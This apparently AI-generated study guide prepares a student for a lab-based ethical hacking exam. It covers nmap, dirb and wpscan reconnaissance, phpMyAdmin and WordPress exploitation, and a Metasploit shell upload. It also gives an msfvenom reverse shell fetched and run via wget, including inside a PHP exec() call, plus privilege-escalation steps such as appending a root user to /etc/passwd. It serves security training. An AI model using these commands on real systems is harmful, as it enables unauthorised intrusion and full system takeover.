<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" class="logo" width="120"/>

## Exam Guide: Ethical Hacking Part 1 - Gaining Access \& Reverse Shell

This guide focuses on the steps required to pass the first part of the exam: breaking into the target machine and establishing a reverse shell, primarily through web application vulnerabilities (like PHPMyAdmin or WordPress) using tools like Exploit-DB and Metasploit (`msfconsole`).

**Goal:** Obtain a reverse shell on the target machine.

### 1. Initial Setup \& Reconnaissance

* **Connect:** Access the provided lab environment (e.g., via VNC `vnc.html` or `vnc_lite.html` using your credentials like `student06`/`Student06`).
* **Identify IPs:**
    * On your attacker machine (Parrot Linux): `ip a` (Find your IP, often under `ens18`, e.g., `30.0.x.y`). Note this as `<attacker_IP>`.
    * Identify the target machine's IP address (e.g., `40.0.x.y`). Note this as `<target_IP>`.
* **Basic Check:** Verify the target is online.
    * `ping <target_IP>` (Note: ICMP might be blocked, so this may fail even if the host is up).
* **Port Scanning (Nmap):** Find open ports and services.
    * `sudo nmap -sS -sV <target_IP>`
        * `-sS`: SYN Scan (Stealth Scan) - efficient TCP scan.
        * `-sV`: Version Detection - tries to identify service versions running on open ports.
    * *If Nmap initially fails because ping is blocked:* `sudo nmap -Pn -sS -sV <target_IP>` (`-Pn`: Skip host discovery, assume host is up).
    * *If needed:* Scan all ports: `sudo nmap -sS -sV -p- <target_IP>` (takes longer). The exam might focus on common ports found in the default scan.
    * Note down open ports (e.g., 80/HTTP, 443/HTTPS, 21/FTP, 22/SSH) and detected service versions.


### 2. Web Enumeration \& Vulnerability Identification

* **Directory/File Brute-Forcing (Dirb):** Find hidden directories or files on web servers (Port 80/443).
    * `dirb http://<target_IP> /usr/share/wordlists/dirb/common.txt`
    * *Remember to bring this wordlist (`common.txt`)!*
    * Look for interesting paths like `/admin`, `/phpmyadmin`, `/wordpress`, configuration files, etc.
* **Specific Application Scanning (if applicable):**
    * **WordPress:** If a WordPress site is found (`/wordpress` or detected by Nmap/Dirb):
        * `sudo wpscan --url http://<target_IP>/[wordpress_path] -e ap,at,u`
        * `-e ap,at,u`: Enumerate All Plugins, All Themes, Users.
        * Note down versions (WordPress core, themes, plugins).
    * **PHPMyAdmin:** If found via Dirb. Note the path (e.g., `/phpmyadmin`). Try to find the version:
        * Check the login page source code (View Source) for version numbers (e.g., `?v=4.8.1`).
        * Sometimes the version is displayed directly on the page.
* **Vulnerability Research (Exploit-DB):**
    * Go to `exploit-db.com`.
    * Search for exploits based on the identified software and versions (e.g., "phpmyadmin 4.8.1", "wordpress plugin [plugin_name] [version]").
    * Focus on **Remote Code Execution (RCE)** vulnerabilities.
    * Prioritize **verified** exploits (check mark).
    * Download relevant exploit scripts (often Python `.py` or Ruby `.rb`).


### 3. Exploitation \& Initial Access

Based on your findings, attempt exploitation. Here are common scenarios from your notes:

**Scenario A: PHPMyAdmin RCE**

1. **Find Exploit:** Search Exploit-DB for a verified RCE exploit matching the PHPMyAdmin version (e.g., 4.8.1 RCE).
2. **Use Exploit Script:** Download the script (e.g., `pma.py`). Run it, providing necessary arguments like target IP, port, web path, credentials (if known or default like `pma`/`pmapass`), and the command to execute.

```bash
# Example: Test command execution first
python3 pma.py <target_IP> 80 /phpmyadmin pma pmapass 'whoami'
# If successful, use this to execute the reverse shell download/run commands later
```

*This gives you command execution.* Proceed to the Reverse Shell step.

**Scenario B: WordPress Exploitation**

* **Option 1: Vulnerable Plugin/Theme:**

1. Find exploit on Exploit-DB based on `wpscan` results.
2. Download and run the exploit (e.g., `python3 wp_plugin_exploit.py http://<target_IP>/[wordpress_path]`).
3. If it grants RCE or a webshell upload, proceed to the Reverse Shell step.
* **Option 2: Brute-Force Credentials:**

1. Use `wpscan` to brute-force login (uses XML-RPC, less likely to lock out):

```bash
wpscan --url http://<target_IP>/[wordpress_path] --usernames <user_list_or_name> --passwords /usr/share/wordlists/rockyou.txt
```

*Remember to bring `rockyou.txt`!* Exam passwords are often within the first few thousand entries.
2. If successful (e.g., found `admin`/`finalfantasy`), login to the WordPress admin panel (`/wp-admin`).
* **Option 3: Use Metasploit (If Admin Access Gained):** This is often reliable.

1. Start Metasploit: `msfconsole`
2. Search for the exploit: `search wp_admin_shell_upload`
3. Use the exploit: `use exploit/unix/webapp/wp_admin_shell_upload`
4. Show options: `options`
5. Set required options:

```
set RHOSTS <target_IP>
set TARGETURI /[wordpress_path]/
set USERNAME <wordpress_admin_user>
set PASSWORD <wordpress_admin_password>
set LHOST <attacker_IP>
set LPORT <listening_port_for_msf> (e.g., 4445)
```

6. Run: `run` or `exploit`
7. This should give you a Meterpreter or standard shell. If it's a standard shell, skip to Step 5 (Shell Upgrade). If Meterpreter, type `shell` to get a standard shell first.


### 4. Establishing Reverse Shell (The "CMD Shell" Technique)

This is the core method to get a stable shell once you have *any* form of command execution (from PHPMyAdmin exploit, WordPress theme edit, etc.).

1. **Generate Payload (Attacker):** Create a stageless reverse shell executable using `msfvenom`.

```bash
# Choose a port NOT already in use, e.g., 4444
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f elf > shell.elf
```

    * `-p`: Payload (Linux, 64-bit, stageless TCP reverse shell).
    * `LHOST`: Your attacker machine's IP.
    * `LPORT`: The port your listener will use (e.g., 4444).
    * `-f elf`: Output format (Executable for Linux).
    * `> shell.elf`: Save output to `shell.elf`. *Remember this filename.*
2. **Start Listener (Attacker - Terminal 1):** Listen for the incoming connection on the port you chose.

```bash
nc -lvnp 4444
```

    * `-l`: Listen mode.
    * `-v`: Verbose output.
    * `-n`: No DNS resolution.
    * `-p`: Port number (must match `LPORT` in `msfvenom`).
3. **Serve Payload (Attacker - Terminal 2):** Start a simple web server in the *same directory* where you saved `shell.elf`.

```bash
# Use default port 8000 or specify one like 8001
python3 -m http.server 8000
```

*Note the port (8000 here).*
4. **Trigger Execution (Target):** Use your command execution vulnerability (from Step 3) to download, make executable, and run the payload on the target. Common location: `/tmp`.

```bash
# Command(s) to run on the target via the exploit:
cd /tmp; rm -f shell.elf; wget http://<attacker_IP>:8000/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf
```

    * Breakdown: Change to `/tmp`, remove any old `shell.elf`, download the new one from your python server (`wget`), make it executable (`chmod +x` or `chmod 777`), and run it.
    * *Modify:* Use `curl -o shell.elf http://...` if `wget` isn't available. Ensure filename matches (`shell.elf`). Ensure IP and port match your attacker machine and Python server. Combine commands with `;`.
    * **If using the PHPMyAdmin exploit script:** Replace the test command (like `'whoami'`) with this full command string.

```bash
python3 pma.py <target_IP> 80 /phpmyadmin pma pmapass 'cd /tmp; rm -f shell.elf; wget http://<attacker_IP>:8000/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf'
```

    * **If using WordPress manual theme edit (less recommended):** Embed the command string within a PHP `exec()` or `system()` call in the theme file (e.g., `comments.php`) and trigger it by visiting the relevant page.

```php
<?php exec("cd /tmp; rm -f shell.elf; wget http://<attacker_IP>:8000/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf"); ?>
```

5. **Check Connection:** Look at your `nc` listener terminal (Terminal 1). You should see a "connect to [...] from [...]" message. You now have a shell!

### 5. Shell Interaction \& Upgrade

* You likely have a basic, non-interactive shell. Test with `id` or `whoami`.
* **Upgrade to Interactive Shell:** This is crucial for using commands like `sudo`.

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

*If `python3` fails, try `python`. If `/bin/bash` fails, try `/bin/sh`.*
* You now have a more usable shell. This successfully completes Part 1.

---

## Part 2 Quick Reference (Privilege Escalation - Beyond Passing Grade)

If you complete Part 1 quickly, you can attempt Privilege Escalation (PE) for a higher grade. Here are key checks from your notes:

* **Check `sudo` rights:**
    * `sudo -l` (See if you can run commands as root without a password).
* **Find SUID/SGID binaries:**
    * `find / -perm -u=s -type f 2>/dev/null` (Find files owned by root that run with root privileges).
    * Check GTFOBins website for how to exploit these (e.g., `gdb`, `find`, `cp`, etc.).
* **Check File Permissions:**
    * `ls -l /etc/passwd /etc/shadow`
    * `getfacl /etc/passwd /etc/shadow` (Check if your user or a group you're in can write to these).
    * **If `/etc/passwd` is writable:** Add a new root user.

1. Generate hash *beforehand*: `openssl passwd -1 -salt xyz mypassword` (replace `mypassword`)
2. Append to `/etc/passwd`: `echo 'newroot:<generated_hash>:0:0:root:/root:/bin/bash' >> /etc/passwd`
3. Switch user: `su newroot` (enter `mypassword`).
* **Look for SSH keys:**
    * `ls -la /home/*/.ssh/` (Check for private keys `id_rsa`).
* **Crack Hashes:**
    * If you find hashes (e.g., in `/etc/shadow` or database dumps):

1. Save hash(es) to a file (`hashes.txt`). Format correctly (e.g., `username:<hash_string>`).
2. Use `john`: `sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hashes.txt` (adjust `--format` if needed, e.g., based on `$id$` prefix in hash).
3. If cracked, `su <username>`.
* **Check Running Processes/Cron Jobs:** Look for scripts or processes running as root that you might be able to influence (e.g., modifiable scripts, PATH hijacking).
* **Use Enumeration Scripts:** Linpeas (`linpeas.sh`) can automate many checks.

---

## Quick Command Cheatsheet

* **Scanning:** `nmap -sS -sV <IP>`, `nmap -Pn ...`, `dirb http://<IP> <wordlist>`
* **WordPress:** `wpscan --url <URL> -e ap,at,u`, `wpscan ... --usernames <user> --passwords <wordlist>`
* **Metasploit:** `msfconsole`, `search <term>`, `use <exploit>`, `options`, `set <option> <value>`, `run`
* **Payload Generation:** `msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> > <outfile>`
* **Listener:** `nc -lvnp <port>`
* **Web Server:** `python3 -m http.server <port>`
* **Shell Upgrade:** `python3 -c "import pty; pty.spawn('/bin/bash')"`
* **Privilege Escalation Checks:** `sudo -l`, `find / -perm -u=s -type f 2>/dev/null`, `ls -l /etc/passwd`, `getfacl /etc/passwd`
* **Password Cracking:** `john --wordlist=<list> --format=<fmt> <hashfile>`

**Reminders:**

* Always check attacker and target IPs (`ip a`).
* Bring wordlists: `/usr/share/wordlists/dirb/common.txt`, `/usr/share/wordlists/rockyou.txt`.
* If you modify and re-upload a file (like a shell), give it a new name to avoid caching issues (e.g., `shell_v2.elf`).
* Use `/tmp` for writing temporary files on the target.

Good luck with the exam! Focus on getting that reverse shell reliably using the steps above.

